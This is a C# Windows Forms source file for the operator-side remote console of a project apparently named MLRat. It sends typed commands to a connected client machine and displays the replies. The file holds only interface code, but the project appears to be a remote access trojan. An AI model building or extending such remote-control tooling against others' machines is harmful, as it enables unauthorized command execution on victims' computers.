using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MLManagementServer.Forms
{
    public partial class formConsole : Form
    {
        public IClient Client { get; set; }
        public formConsole(IClient c)
        {
            InitializeComponent();
            Client = c;
        }

        public void AddLine(string text)
        {
            Invoke((MethodInvoker)delegate ()
            {
                rtbConsole.AppendText(text + "\n");
                rtbConsole.SelectionStart = rtbConsole.Text.Length;
                rtbConsole.ScrollToCaret();
            });
        }

        private void formConsole_Load(object sender, EventArgs e)
        {
            
            AddLine(">>MLrat Remote Console<<");
        }

        private void tbInput_KeyDown(object sender, KeyEventArgs e)
        {
            if(e.KeyCode == Keys.Enter && !string.IsNullOrWhiteSpace(tbInput.Text))
            {
                Client.Send((byte)NetworkCommand.Console, (byte)ConsoleCommand.SendCommand, tbInput.Text);
                tbInput.Text = string.Empty;
            }
        }
    }
}
